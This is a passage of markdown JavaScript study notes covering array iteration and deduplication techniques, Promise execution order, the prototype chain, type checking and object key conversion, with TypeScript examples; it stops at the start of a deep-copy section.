   - Octal literals are those starting with a leading zero, like `010` stands for 8 in decimal. Octal escape sequences are those starting with `\`, like `\141` stands for `'a'`. We can use `u0061` instead of `\141` to represent `'a'`, and `0o10` instead of `010` to represent `8`.

### Conclusion

By enforcing these constraints, Strict Mode significantly aids in the development of more secure, robust, and clean JavaScript code. It prevents common coding errors, reduces accidental global variable creation, clarifies the scope chain, and enforces a cleaner syntax. Adopting Strict Mode can lead to better performance, easier debugging, and a more structured codebase, which are crucial for maintaining large-scale JavaScript applications.
# 2.1 Traversing.md

## Traverse an Array: `for` vs. `forEach`

### Performance Comparison
1. **Function Calls**: A `for` loop directly accesses each element in the array without additional overhead. In contrast, `forEach` uses a callback function for each element, introducing slight overhead due to the creation of a new execution context for each iteration.
2. **Flexibility and Optimization**: `for` loops offer greater flexibility, allowing the use of `break`, `continue`, and modification of the iteration index. This can lead to more optimized solutions in certain scenarios.

### Readability and Maintenance
Despite the potential speed advantage of `for` loops, `forEach` is often preferred for its readability and maintenance benefits. It provides a more declarative approach to iterating over arrays, improving code clarity and reducing the likelihood of common errors associated with `for` loops, like incorrect index usage.

## Difference between `for..in` and `for..of` loops in JavaScript. 

### For...in Loop iterates over the enumerable properties of an object
- The `for..in` loop iterates over all enumerable properties of an object.
- It is generally used for objects, where the loop iterates over the property keys of the object.
- For arrays, it iterates over the index values (keys) of the array.

```ts
const arr: number[] = [10, 20, 30]; // Array should be defined as number[]
for (let i in arr) {
    console.log(i); // Output: 0, 1, 2 (indexes)
}

const str: string = 'abc';
for (let i in str) {
    console.log(i); // Output: 0, 1, 2 (indexes)
}

const obj = {name: 'aaa', age: 30};
for (let i in obj) {
    console.log(i); // Output: name, age (keys)
}
```

### For...of Loop iterates over the values of an iterable object
- The `for..of` loop iterates over iterable objects such as Arrays, Strings, Maps, NodeLists, and more.
- It is used to iterate over the values in these collections.
- It cannot be used directly on objects since they are not iterable.

```ts
const arr: number[] = [10, 20, 30];
for (let i of arr) {
    console.log(i); // Output: 10, 20, 30 (values)
}

const str: string = 'abc';
for (let i of str) {
    console.log(i); // Output: a, b, c (characters)
}

function fn(){
    for (let arg of arguments) {
        console.log(arg);
    }
}

fn(100, 200, 'aaa'); // Output: 100, 200, 'aaa'

const s1 = new Set([10, 20, 30]);
for (let i of s1) {
    console.log(i); // Output: 10, 20, 30 (Set values)
}

const m1 = new Map([
    ['x', 100],
    ['y', 200],
    ['z', 300]
]);
for (let [key, value] of m1) {
    console.log([key, value]); // Output: ['x', 100], ['y', 200], ['z', 300]
}
```

## Array Flattening Function in JavaScript

**Recursive Approach**
```ts
function arrayFlatten(arr: any[]): any[] {
    let flattenedArray = [];
    for (let i = 0; i < arr.length; i++) {
        if (Array.isArray(arr[i])) {
            flattenedArray = flattenedArray.concat(arrayFlatten(arr[i]));
        } else {
            flattenedArray.push(arr[i]);
        }
    }
    return flattenedArray;
}
```
**Advantages**:
- Works universally, including in environments without ES6 support.
- Easy to understand and implement.

**Disadvantages**:
- Can be less efficient with very deep or very large arrays due to recursive calls.

**Functional Programming Approach**
```ts
function arrayFlatten(arr: any[]): any[]{
    return arr.reduce((prev, cur) => {
        return prev.concat(Array.isArray(cur) ? arrayFlatten(cur) : cur);
    }, []);
}
```
**Advantages**:
- Declarative and concise.
- Leverages functional programming techniques.

**Disadvantages**:
- Recursive, similar performance considerations as the recursive approach.

**Iterative Approach**
```ts
function arrayFlatten(arr: any[]): any[] {
    while (arr.some(Array.isArray)) {
        arr = [].concat(...arr);
    }
    return arr;
}
```
**Advantages**:
- Non-recursive, potentially better performance on large datasets.
- Easy to read and understand.

**Disadvantages**:
- Might not be as intuitive for those unfamiliar with JavaScript's spread operator and `some` method.

**ES6 Flat Method**
```ts
function arrayFlatten(arr: any[]): any[] {
    return arr.flat(Infinity);
}
```
**Advantages**:
- Simplest and most elegant solution.
- Very efficient and concise.

**Disadvantages**:
- Limited browser support; not available in Internet Explorer or older browsers.

## Remove Duplicate Values from an Array

### 1. Using a Set
Utilizing a `Set` is an efficient and straightforward method to remove duplicates from an array. A `Set` in JavaScript automatically discards any duplicate values.

**Example Code**:
```typescript
function removeDuplicates<T>(arr: T[]): T[] {
  return [...new Set(arr)];
}
```
**Time Complexity:** O(n) — as each element is processed once.
**Space Complexity:** O(n) — in the worst case, if all elements are unique, space required is equivalent to the input size.

### 2.1 Using Filter with Index Check
This approach uses the `filter` method combined with `indexOf` to keep only the first occurrence of each element, suitable for those who prefer not to use `Set`.

**Example Code**:
```typescript
function removeDuplicates<T>(arr: T[]): T[] {
  return arr.filter((item, index) => arr.indexOf(item) === index);
}
```
**Time Complexity:** O(n^2) — as `indexOf` checks across the array for each element.
**Space Complexity:** O(n) — to store the filtered array of unique items.

### 2.2 Using Filter with Index Check (Optimized)
To optimize the filtering approach for removing duplicates, we can use a `Set` to track items that have already been seen. This reduces the time complexity significantly.

**Optimized Example Code**:
```typescript
function removeDuplicates<T>(arr: T[]): T[] {
  const seen = new Set<T>();
  return arr.filter(item => {
    if (!seen.has(item)) {
      seen.add(item);
      return true;
    }
    return false;
  });
}
```
**Time Complexity:** O(n) — each element is processed once with set operations that are generally O(1).
**Space Complexity:** O(n) — for the set holding the seen items.

### 3. Using a Map for Object Uniqueness
A `Map` can effectively ensure the uniqueness of objects in an array based on specific properties, such as `id` or `name`.

**Example Code**:
```typescript
interface CustomObject {
  id: number;
  name: string;
}

function removeDuplicates(arr: CustomObject[]): CustomObject[] {
  const unique = new Map<number, CustomObject>();
  arr.forEach(obj => unique.set(obj.id, obj));
  return Array.from(unique.values());
}
```
**Time Complexity:** O(n) — as elements are processed individually and map operations are generally O(1).
**Space Complexity:** O(n) — each unique object is stored once.

### 4.1 Using Reduce with an Accumulator
The `reduce` method can be creatively used to accumulate unique items by checking for their existence before adding.

**Example Code**:
```typescript
function removeDuplicates<T>(arr: T[]): T[] {
  return arr.reduce((acc, current) => {
    if (!acc.includes(current)) {
      acc.push(current);
    }
    return acc;
  }, [] as T[]);
}
```
**Time Complexity:** O(n^2) — because `includes` must iterate over the accumulated items for each array element.
**Space Complexity:** O(n) — for the accumulator array without duplicates.

### 4.2 Using Reduce with an Accumulator (Optimized)
The original use of `includes` can be optimized by using a `Set` to track items that have been added to the accumulator. This avoids the need to iterate over the accumulator with each addition.

**Optimized Example Code**:
```typescript
function removeDuplicates<T>(arr: T[]): T[] {
  const seen = new Set<T>();
  return arr.reduce((acc, current) => {
    if (!seen.has(current)) {
      seen.add(current);
      acc.push(current);
    }
    return acc;
  }, [] as T[]);
}
```
**Time Complexity:** O(n) — since `Set` operations (`has` and `add`) are O(1), and we process each item once.
**Space Complexity:** O(n) — for the set and the accumulator.

### 5.1 Using Sort and Reduce
This method leverages the combination of `sort` and `reduce` to efficiently identify and remove duplicates in a sorted array.

**Example Code**:
```typescript
function removeDuplicates<T>(arr: T[]): T[] {
  return arr.sort().reduce((acc, current) => {
    if (acc.length === 0 || acc[acc.length - 1] !== current) {
      acc.push(current);
    }
    return acc;
  }, [] as T[]);
}
```
**Time Complexity:** O(n log n) — due to the sorting operation.
**Space Complexity:** O(n) — to store the final array of unique items.

### 5.2 Using Sort and Reduce (with Comparator)
To ensure that `sort` behaves predictably across different data types, especially numbers, you can provide a comparator function. This is crucial when the array could contain numeric values or a mix of data types.

**Optimized Example Code**:
```typescript
function removeDuplicates<T>(arr: T[]): T[] {
  return arr.sort((a, b) => {
    if (a > b) {
      return 1;
    } else if (a < b) {
      return -1;
    } else {
      return 0;
    }
  }).reduce((acc, current) => {
    if (acc.length === 0 || acc[acc.length - 1] !== current) {
      acc.push(current);
    }
    return acc;
  }, [] as T[]);
}
```
**Time Complexity:** O(n log n) — due to the sorting operation.
**Space Complexity:** O(n) — to store the resulting array of unique items.

### 6. Using ES6 `from` Method
The `from` method of `Array` can be used to create a new array from an iterable object, such as a `Set`, which automatically removes duplicates.
```typescript
function removeDuplicates<T>(arr: T[]): T[] {
  return Array.from(new Set(arr));
}
```

## Find Max Number in a List
### Method 1: Using Spread Operator with `Math.max`

**Code**:
```ts
function findMaxNumber(arr: number[]): number {
  return Math.max(...arr);
}
```

**Explanation**:
- Utilizes the spread operator `...` to expand the array elements as individual arguments to `Math.max`.
- Simple and clean, but may lead to performance issues or a stack overflow error with very large arrays due to limitations in the number of arguments that can be passed to a function.

### Method 2: Using `Math.max` with `apply`

**Code**:
```ts
function findMaxNumber(arr: number[]): number {
  return Math.max.apply(null, arr);
}
```

**Explanation**:
- Similar to the previous method but uses `apply` to pass the array as an argument list to `Math.max`.
- Avoids the potential stack overflow of the spread operator but still may encounter performance issues with very large datasets.

### Method 3: Using `reduce` Method

**Code**:
```ts
function findMaxNumber(arr: number[]): number {
  return arr.reduce((acc, cur) => acc > cur ? acc : cur, arr[0]);
}
```

**Explanation**:
- Implements the `reduce` function to traverse the array and maintain the highest value found.
- Provides good performance for large arrays and is the most functional programming approach among the listed methods.

### Method 4: Using `sort`

**Code**:
```ts
function findMaxNumber(arr: number[]): number {
  return arr.sort((a, b) => b - a)[0];
}
```

**Explanation**:
- Sorts the array in descending order and selects the first element.
- This method is less efficient due to the overhead of sorting the entire array and should be used when the smallest or a specific order of elements is also needed.

## Spread Operator in JavaScript
The spread operator (`...`) allows an iterable such as an array to be expanded in places where zero or more arguments (for function calls) or elements (for array literals) are expected.

**Example Code in TypeScript:**
```ts
const baseArray = [1, 2, 3, 4];
const array = [...baseArray];
```
**BabelJS Compilation:**
In environments that do not support ES6 syntax, BabelJS transforms the code to ensure compatibility. The TypeScript code example using the spread operator is compiled to the following JavaScript by BabelJS:
```js
var baseArray = [1, 2, 3, 4];
var array = [].concat(baseArray);
```
**Explanation:**
- `var baseArray = [1, 2, 3, 4];` declares an array using ES5 syntax.
- `var array = [].concat(baseArray);` uses the `concat` method to merge `baseArray` into a new array, mimicking the effect of the spread operator.

### BabelJS Overview
**BabelJS** is a powerful JavaScript compiler extensively used in modern web development. It helps developers use newer JavaScript features by converting ECMAScript 2015+ code into a version that is compatible with older browsers and environments. This process enhances cross-browser compatibility and ensures that advanced features can be used without waiting for complete support across all platforms.

## JavaScript Array Methods

**Concatenation**
- **Method:** `concat()`
- **Description:** Joins two or more arrays, returning a new array without altering the originals.
- **Example:**
  ```javascript
  const array1 = ['a', 'b', 'c'];
  const array2 = ['d', 'e', 'f'];
  const newArray = array1.concat(array2);
  console.log(newArray);  // Output: ['a', 'b', 'c', 'd', 'e', 'f']
  ```

**Element Checking**
- **Methods:**
  - `every()`: Tests whether all elements in the array pass the provided function.
  - `some()`: Tests whether any element in the array passes the provided function.
- **Examples:**
  ```javascript
  const isBelowThreshold = (currentValue) => currentValue < 40;
  const array1 = [1, 30, 39, 29, 10, 13];
  console.log(array1.every(isBelowThreshold)); // Output: true
  console.log(array1.some(isBelowThreshold));  // Output: true
  ```

**Filtering**
- **Method:** `filter()`
- **Description:** Creates a new array with all elements that pass the test implemented by the provided function.
- **Example:**
  ```javascript
  const words = ['spray', 'limit', 'elite', 'exuberant', 'destruction', 'present'];
  const result = words.filter(word => word.length > 6);
  console.log(result);  // Output: ['exuberant', 'destruction', 'present']
  ```

**Mapping**
- **Method:** `map()`
- **Description:** Creates a new array populated with the results of calling a provided function on every element in the calling array.
- **Example:**
  ```javascript
  const numbers = [1, 4, 9, 16];
  const roots = numbers.map(Math.sqrt);
  console.log(roots);  // Output: [1, 2, 3, 4]
  ```

**Sorting**
- **Method:** `sort()`
- **Description:** Sorts the elements of an array in place and returns the array. The sort is not necessarily stable or in numerical order by default.
- **Example:**
  ```javascript
  const months = ['March', 'Jan', 'Feb', 'Dec'];
  months.sort();
  console.log(months);  // Output: ['Dec', 'Feb', 'Jan', 'March']
  ```

**Reversing**
- **Method:** `reverse()`
- **Description:** Reverses the array in place. The first array element becomes the last, and the last array element becomes the first.
- **Example:**
  ```javascript
  const array1 = ['one', 'two', 'three'];
  array1.reverse();
  console.log(array1);  // Output: ['three', 'two', 'one']
  ```

**Conversion to String**
- **Method:** `toString()`
- **Description:** Converts an array to a string of comma-separated array values.
- **Example:**
  ```javascript
  const array1 = [1, 2, 'a', '1a'];
  console.log(array1.toString());  // Output: '1,2,a,1a'
  ```

**Index Finding**
- **Methods:**
  - `indexOf()`: Returns the first index at which a given element can be found in the array, or -1 if it is not present.
  - `lastIndexOf()`: Returns the last index at which a given element can be found in the array, or -1 if it is not present.
- **Examples:**
  ```javascript
  const beasts = ['ant', 'bison', 'camel', 'duck', 'bison'];
  console.log(beasts.indexOf('bison'));        // Output: 1
  console.log(beasts.lastIndexOf('bison'));   // Output: 4
  ```

## Remove indicated elements from a list

### Functional Approach Using `filter`
```js
const removeElements = (arr, ...args) => arr.filter(item => !args.includes(item));
```
**Advantages**:
- **Immutability**: The original array remains unchanged.
- **Declarative**: Easy to read and understand.

**Disadvantages**:
- **Performance**: Using `includes` within `filter` can lead to quadratic time complexity (O(n*m)), where `n` is the length of `arr` and `m` is the length of `args`.

### Iterative Approach Using `forEach` and `splice`
This method involves iterating over the array and directly removing elements using `splice`. It modifies the array in place.

```js
const removeElements = (arr, ...args) => {
    let i = 0;
    while (i < arr.length) {
        if (args.includes(arr[i])) {
            arr.splice(i, 1);
        } else {
            i++;
        }
    }
    return arr;
}
```
**Advantages**:
- **Efficiency**: Reduces the need to create a new array.

**Disadvantages**:
- **Mutability**: Modifies the original array, which can lead to side effects.
- **Complexity**: More complex and less readable than the functional approach.

### Optimized Approach Using `Set`
To optimize, especially when the list of elements to remove (`args`) is large, we can use a `Set` for faster lookups.

```js
const removeElements = (arr, ...args) => {
    const toRemove = new Set(args);
    return arr.filter(item => !toRemove.has(item));
}
```
**Advantages**:
- **Performance**: `Set` has average time complexity of O(1) for lookups, making this approach more suitable for larger data sets.
- **Clarity and Safety**: Combines the clarity of the functional approach with the performance of using a `Set`.

# 2.2 Promise & Async.md

## JavaScript Promises

### Definition and Basic Example
A **Promise** in JavaScript is an object that represents the eventual completion or failure of an asynchronous operation. It serves as a link between the executing code and the resulting success outcome or failure reason. Here's a simple example to illustrate its use:

```javascript
const promise = new Promise((resolve, reject) => {
  setTimeout(() => {
    resolve('Success!');
  }, 1000);
});

promise.then(value => {
  console.log(value); // Outputs: Success!
});
```

### States of a Promise
**Promise** objects can exist in one of three states:
- **Pending:** The initial state of a promise. The outcome is not yet known.
- **Fulfilled:** Indicates that the asynchronous operation completed successfully.
- **Rejected:** Indicates that the asynchronous operation failed.

### Prototype Methods
#### Promise.prototype.then()
This method is used for chaining multiple operations that should occur after the Promise settles. It accepts two callback functions: one for success (`resolve`) and one for failure (`reject`). Here's how chaining works:

```javascript
promise.then(result => {
  return result + ' and more!';
}).then(newResult => {
  console.log(newResult); // Outputs: Success! and more!
});
```

#### Promise.prototype.catch()
Used for error handling, this method is a shorthand for `.then(undefined, rejectionHandler)`. It captures any errors that occur during the promise execution chain.

#### Promise.prototype.finally()
This method executes a final piece of code after the Promise is settled, regardless of its outcome, useful for cleaning up resources or logging:

```javascript
promise.finally(() => {
  console.log('Promise was settled.');
});
```

### Promise Static Methods
#### Promise.all()
Allows for the handling of multiple promises concurrently. It returns a single Promise that resolves when all of the input promises have resolved, or rejects if any input promise rejects:

```javascript
const promise1 = Promise.resolve(3);
const promise2 = 42;
const promise3 = new Promise((resolve, reject) => {
  setTimeout(resolve, 100, 'foo');
});

Promise.all([promise1, promise2, promise3]).then(values => {
  console.log(values); // Outputs: [3, 42, 'foo']
});
```

#### Promise.race()
Returns a promise that resolves or rejects as soon as one of the promises in an iterable resolves or rejects, with the value or reason from that promise:

```javascript
const promiseOne = new Promise((resolve, reject) => {
  setTimeout(resolve, 500, 'one');
});
const promiseTwo = new Promise((resolve, reject) => {
  setTimeout(reject, 100, 'two');
});

Promise.race([promiseOne, promiseTwo]).then(value => {
  console.log(value);
}).catch(reason => {
  console.log(reason); // Outputs: two
});
```

#### Promise.resolve() and Promise.reject()
- **Promise.resolve(value)** returns a promise that is resolved with the given value.
- **Promise.reject(reason)** returns a promise that is rejected with the given reason.

## Understanding Promise Execution Order
### Basic Promise Execution Flow
```javascript
Promise.resolve().then(() => {
  console.log(0);
  return Promise.resolve(4);
}).then((res) => {
  console.log(res);
});

Promise.resolve().then(() => {
  console.log(1);
}).then(() => {
  console.log(2);
}).then(() => {
  console.log(3);
}).then(() => {
  console.log(5);
}).then(() => {
  console.log(6);
});
```

**Expected Output:** `0 1 2 3 4 5 6`.

**Key Points:**   
- Promises that are resolved invoke their `.then()` callbacks in a sequence.
- The JavaScript event loop facilitates a balanced execution flow across various promise chains, preventing any single promise from monopolizing the event loop's attention.
- When a `.then()` callback generates a new promise, it introduces an additional task in the microtask queue. This ensures that the new promise's resolution is queued following the microtask queue's principles, allowing the ongoing execution to proceed uninterrupted.

### Interleaved Execution with Multiple Promises
```javascript
Promise.resolve().then(() => {
  console.log(0);
}).then(() => {
  console.log(1);
}).then(() => {
  console.log(2);
});

Promise.resolve().then(() => {
  console.log(3);
}).then(() => {
  console.log(4);
}).then(() => {
  console.log(5);
});

Promise.resolve().then(() => {
  console.log(6);
}).then(() => {
  console.log(7);
}).then(() => {
  console.log(8);
});
```

**Expected Output:** `0 3 6 1 4 7 2 5 8`.

**Explanation:**  
- This example illustrates how the execution of `.then()` callbacks from multiple promises can be interleaved. This approach ensures that asynchronous tasks initiated around the same time advance in a balanced manner.

### Delayed Execution with Nested Promises
```javascript
Promise.resolve().then(() => {
  console.log(0);
  return Promise.resolve(1);
}).then(() => {
  console.log(2);
}).then(() => {
  console.log(3);
});

Promise.resolve().then(() => {
  console.log(4);
  return Promise.resolve(5);
}).then(() => {
  console.log(6);
}).then(() => {
  console.log(7);
});
```
**Output:** `0 4 2 6 3 7`.

**Detailed Insights:**  
- When a `.then()` callback returns another promise, it delays the execution order. This delay is twofold: one for the promise to settle and another for its resolution to be queued in the microtask queue.
- This highlights the role of the event loop and microtask queue in managing the execution order of asynchronous operations in JavaScript, demonstrating the intricacies of asynchronous execution timing.

### Simulating Promise Execution Order
```javascript
Promise.resolve().then(() => {
  // First beat
  const p = Promise.resolve(1);
  Promise.resolve().then(() => {
    // Second beat
    p.then(res => {
      console.log(res);
    }).then(() => {
      console.log(2);
    });
  });
});
```

This simulation illustrates the complexity of managing asynchronous operations with promises. It emphasizes the importance of understanding the scheduling mechanisms of promises and their resolutions by the JavaScript event loop and microtask queue to effectively control asynchronous code flow.

## What is and when to use `for await...of`
The for await...of statement is a feature in JavaScript that allows you to loop over asynchronous iterables—objects that you can iterate over asynchronously, such as Promises. It waits until the Promise is resolved before moving to the next iteration, making it useful for handling asynchronous operations in a sequential manner.
```ts
async function processPromises() {
    function createPromise(val) {
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(val);
            }, 1000);
        });
    }

    const p1 = createPromise(100);
    const p2 = createPromise(200);
    const p3 = createPromise(300);
    const list = [p1, p2, p3];

    // Iterating over an array of Promises and logging each resolved value
    // effect is same as:
    // Promise.all(list).then(res => console.log(res))
    for await (let res of list) {
        console.log(res);
    }

    // Performing asynchronous operations in sequence
    const arr = [100, 200, 300];
    for (let num of arr) {
        const res = await createPromise(num); // Ensure this code is inside an async function
        console.log(res);
    }
}

processPromises();
```

The `for await...of` loop is a powerful feature for handling asynchronous operations in JavaScript, providing a more intuitive and cleaner way to process sequences of Promises compared to chaining or using `Promise.all()`. It's particularly useful in scenarios where you need to maintain the order of operations or when working with streams of asynchronous data.

`Promise.all()` only make sure the promises are resolved in parallel, or there is an error in any of the promises, but `for await...of` makes sure the promises are resolved in sequence.


# 2.3 Object & Prototype.md

## What is the JavaScript Prototype Chain? How is it Formed?
Javascript is sometimes referred to as a "prototype-based language" because it relies heavily on prototypal inheritance. The prototype chain is a mechanism that allows objects to inherit properties and methods from other objects. 

When a property or method is accessed on an object, JavaScript will first look for it on the object itself. If it's not found, it will look up the prototype chain to find the property or method on the object's prototype. This process continues up the chain until the property or method is found or until the end of the chain is reached.

The top of the prototype chain is the `Object.prototype` object, which includes common methods and properties like `toString` and `valueOf`. All objects in JavaScript inherit from `Object.prototype`, either directly or indirectly through the prototype chain. That's why you can call methods like `toString` on any object in JavaScript.

### Distinction Between Functions and Objects
JavaScript treats functions as first-class objects, meaning that every function in JavaScript is actually a special type of object. This distinction is crucial for understanding the prototype chain. There are two key properties involved in the prototype chain mechanism: `prototype` and `__proto__`.

- **`prototype` Property**: This property is present only in functions. It points to the prototype object that will be assigned as the `__proto__` of instances created by that function when using the `new` keyword.
- **`__proto__` Property**: Every object (including function objects) has this property, which points to the object's prototype, forming a chain up to `null`, the end of the prototype chain.

### Formation of the Prototype Chain

The prototype chain is primarily established through constructor functions and the `new` keyword. Here's how it works step by step:

1. **Constructor Function Creation**: A constructor function is defined by the user. This function has a `prototype` property pointing to an object that will serve as the prototype for instances created from this constructor.

2. **Instance Creation**: When a new instance is created using the `new` keyword, JavaScript automatically sets the instance's internal `[[Prototype]]` property (accessible in most environments as `__proto__`) to the prototype object of the constructor function. This links the new object to its prototype.

3. **Chain Linking**: As each object can have its own prototype, this creates a "chain" of prototypes, ultimately ending at `Object.prototype`, whose `__proto__` is `null`, signifying the end of the prototype chain.

Let's explore a concise example to illustrate these concepts:

```javascript
function Person(name) {
  this.name = name; // Instance property
}

// Adding a method to the Person prototype
Person.prototype.sayHello = function() {
  console.log(`Hello, my name is ${this.name}`);
};

// Creating an instance of Person
const alice = new Person('Alice');

// Invoking the sayHello method inherited from Person.prototype
alice.sayHello(); // Outputs: Hello, my name is Alice

// Examining the prototype chain of alice
console.log(alice.__proto__ === Person.prototype); // true: alice's prototype is Person.prototype
console.log(Person.prototype.__proto__ === Object.prototype); // true: Person.prototype's prototype is Object.prototype
console.log(Object.prototype.__proto__); // null: Object.prototype is the end of the chain
```

In this example:
- The `alice` instance is linked to `Person.prototype`, and through it, to `Object.prototype`, finally reaching `null`.
- This chain allows `alice.sayHello()` to execute successfully. Although `sayHello` is not a direct property of `alice`, JavaScript engine finds it up the chain in `Person.prototype`.

## Differences between `Object.create` and `{}`
1. **Using `{}` (Object Literals)**: This is the most common way to create an object. The created object inherits from `Object.prototype`, making it an instance of Object.

    ```typescript
    const obj1 = {};
    console.log(obj1.__proto__ === Object.prototype); // true
    ```

2. **Using `Object.create(proto)`**: This method creates a new object with the specified object as its prototype. This allows for more flexibility in setting up the prototype chain.

    - **`Object.create(Object.prototype)`**: Creates a new object with `Object.prototype` as its prototype, similar to `{}`.
    - **`Object.create({name: 'Tom'})`**: Creates a new object with a custom object (`{name: 'Tom'}`) as its prototype, diverging from `Object.prototype`.

    ```typescript
    const obj2 = Object.create(Object.prototype);
    const obj3 = Object.create({name: 'Tom'});
    console.log(obj2.__proto__ === Object.prototype); // true
    console.log(obj3.__proto__ === Object.prototype); // false
    ```

## How to Simulate the `new` Operator in JavaScript

When the `new` keyword is used in JavaScript, it performs several actions behind the scenes to create a new instance of an object based on a constructor function. Here's what happens step by step, and how to simulate this process:

1. **Create an empty object** that inherits from the constructor function's prototype.
2. **Execute the constructor function** with the newly created object assigned to `this`.
3. **Return the new object** unless the constructor explicitly returns a different object.

The method to simulate the `new` process can be represented as follows:

```typescript
function _new(fn: Function, ...args: any[]): any {
    const obj = Object.create(fn.prototype); // Step 1
    const res = fn.apply(obj, args); // Step 2
    return res instanceof Object ? res : obj; // Step 3
}

// Test example
function Person(name: string) {
    this.name = name;
}
const person = _new(Person, 'Tom');
console.log(person.name); // Tom
```

### `class` is Syntactic Sugar for Constructor Functions

It's important to note that a `class` in JavaScript is essentially syntactic sugar over the existing prototype-based inheritance and does not introduce a new object-oriented inheritance model. At its core, a class is just a special type of function, and thus `typeof ClassName === 'function'`.

## Determining Variable Types in JavaScript

Understanding the type of a variable is crucial in JavaScript due to its dynamically typed nature. This section explores various methods to ascertain the type of variables effectively.

### `typeof` Operator
**Overview:**
The `typeof` operator is a straightforward tool used to determine the primitive type of a variable.

**Examples and Usage:**
```javascript
console.log(typeof 1); // Output: 'number'
console.log(typeof 'test'); // Output: 'string'
console.log(typeof true); // Output: 'boolean'
```

**Advantages:**
- Simple and quick to use for identifying primitive types.

**Limitations:**
- Inadequate for non-primitive types, as it returns `'object'` for arrays, null, and plain objects, which can be misleading.

### `Object.prototype.toString.call()`
**Overview:**
A more robust method for type checking that addresses the limitations of the `typeof` operator by providing a precise type string for all objects.

**Examples and Usage:**
```javascript
console.log(Object.prototype.toString.call([1, 2, 3])); // Output: '[object Array]'
console.log(Object.prototype.toString.call(null)); // Output: '[object Null]'
```

**Advantages:**
- Provides detailed type information, helpful in debugging and validation processes.

**Limitations:**
- More verbose and complex compared to `typeof`, potentially increasing code complexity for simple checks.

### `instanceof` Operator
**Overview:**
Used to verify whether an object is an instance of a particular class or constructor function within its prototype chain.

**Examples and Usage:**
```javascript
console.log([] instanceof Array); // Output: true
console.log({} instanceof Object); // Output: true
```

**Limitations:**
- Only applicable to objects created by constructors, not suitable for primitive types.

### Custom `getType` Function
**Overview:**
To overcome the limitations of the above methods, a custom function can be defined to provide a comprehensive type checking mechanism.

**Function Definition and Usage:**
```javascript
function getType(val) {
    const type = typeof val;
    if (type !== 'object') {
        return type; // Directly return the type of primitives.
    } else if (val === null) {
        return 'null'; // Correctly identify null.
    }
    // Use Object.prototype.toString for detailed object type identification.
    return Object.prototype.toString.call(val).slice(8, -1).toLowerCase();
}

console.log(getType(null)); // Output: 'null'
console.log(getType([1, 2, 3])); // Output: 'array'
```

**Advantages:**
- Provides accurate type information for both primitive and reference types, enhancing debugging and validation.

**Enhanced Comprehension:**
This custom function integrates the strengths of both `typeof` and `Object.prototype.toString.call()` methods, offering a versatile tool for type checking in JavaScript applications. It simplifies the process while ensuring accuracy and comprehensiveness in type determination.

## Object Key Data Types in JavaScript

In JavaScript, the keys of an object can only be strings or symbols. This fundamental principle ensures consistency in how JavaScript engines interpret key values. However, when other data types are used as keys, they undergo a conversion process. Below, we explore the rules and nuances of this conversion process, along with practical examples to deepen understanding.

### Principles of Key Conversion

1. **Allowed Key Types**: Only strings and symbols can be used directly as keys. This limitation is designed to ensure property keys have a predictable format.
2. **Conversion of Other Types**: If a key is not a string or symbol, JavaScript will automatically convert it to a string using the object's `toString()` method.
3. **Conversion Rule**: The `toString()` method is universally applied to non-string, non-symbol keys to obtain their string representation.
4. **Plain Object Conversion**: Any plain object used as a key is converted to the string `"[object Object]"`. This conversion underscores the importance of string and symbol uniqueness.
5. **Map Object Exception**: Unlike object literals, `Map` objects can use values of any type as keys without automatic conversion. This feature makes `Map` a versatile alternative for complex data structures.

### Examples and Explanations

**Example 1: Numeric and String Key Equivalence**

```javascript
let a = {}, b = '123', c = 123;
a[b] = 'b';
a[c] = 'c';
console.log(a[b]); // Outputs: 'c'
```
- In this example, both `b` (a string) and `c` (a number) are used as keys. Since `c` is converted to a string, it overwrites the value associated with the string `'123'`, demonstrating how numeric keys are treated as their string equivalents.

**Example 2: Symbol Uniqueness**

```javascript
let a = {}, b = Symbol('123'), c = Symbol('123');
a[b] = 'b';
a[c] = 'c';
console.log(a[b]); // Outputs: 'b'
```
- Symbols are unique, so even if `b` and `c` have the same description (`'123'`), they are considered different keys. This example illustrates the utility of symbols for creating distinct key-value pairs.

**Example 3: Plain Object Conversion to String**

```javascript
let a = {}, b = {key: '123'}, c = {key: '456'};
a[b] = 'b';
a[c] = 'c';
console.log(a[b]); // Outputs: 'c'
```
- Here, `b` and `c` are both plain objects. Despite having different properties, they are converted to the same string (`"[object Object]"`) when used as keys, causing `c` to overwrite `b`'s associated value. This highlights the importance of careful key selection to avoid unintended overwrites.

## Value Types vs. Reference Types
**What is the output of the following code, and why?**

```javascript
let a = {n: 1}
let b = a
a.x = a = {n: 2}
console.log(a.x)
console.log(b.x)
```

To decipher the output of this code snippet, we must delve into several core JavaScript mechanics:

1. **Sequential Assignments Are Executed Right-to-Left**

   Sequential assignments in JavaScript are processed from right to left. This means the right-most assignment is completed first before moving to the left. Here's a simple illustration:

   ```javascript
   let a = 100;
   let b = a = 200;
   // This is processed as:
   // 1. a = 200
   // 2. b = a (where a is now 200)
   ```

2. **Dot Notation for Property Access Has High Precedence**

   When accessing or assigning properties using dot notation, the operation to access the property (or create a reference to it) is prioritized. For instance:

   ```javascript
   let a = {};
   a.x = 100;
   // This operation can be broken down into:
   // 1. Access (or prepare to access) a.x, which is initially undefined
   // 2. Assign 100 to a.x
   ```

With these principles in mind, let's dissect the initial example:

```javascript
let a = {n: 1}
let b = a;
// At this point, both 'a' and 'b' reference the same object: {n: 1}

a.x = a = {n: 2};
// The operations unfold as follows:
// 1. The dot notation (a.x) creates a reference for 'x' on the object, setting it to undefined
// 2. 'a' is then reassigned to a new object: {n: 2}
// 3. Finally, 'a.x' assigns the new object {n: 2} to 'x', but since 'a' has been reassigned, this operation does not affect the new 'a' but the old object referenced by 'b'
```

Here's a visual representation of the state changes:

1. After declaring `a` and `b`:

```
a, b -> {n: 1}
```

2. Preparing to assign to `a.x`:

```
a, b -> {n: 1, x: undefined}
```

3. Reassigning `a`:

```
a -> {n: 2}
b -> {n: 1, x: undefined}
```

4. Attempting to assign `{n: 2}` to `a.x`, which now refers to the old object `b` references:

```
a -> {n: 2}
b -> {n: 1, x: {n: 2}}
```

### Outputs:

- `console.log(a.x)` prints `undefined`, because 'a' now points to `{n: 2}`, which does not have an 'x' property.
- `console.log(b.x)` prints `{n: 2}`, because 'b' still points to the original object, which now includes `x: {n: 2}`.

## Implement a Deep Copy Function

Creating a deep copy function in JavaScript is crucial when you want to duplicate complex data structures without altering the original data. This function must handle various data types, including Maps, Sets, and objects with circular references. The common approach using `JSON.stringify` and `JSON.parse` falls short for these use cases due to its limitations with certain data types and structures.

### Why Not `JSON.stringify` and `JSON.parse`?

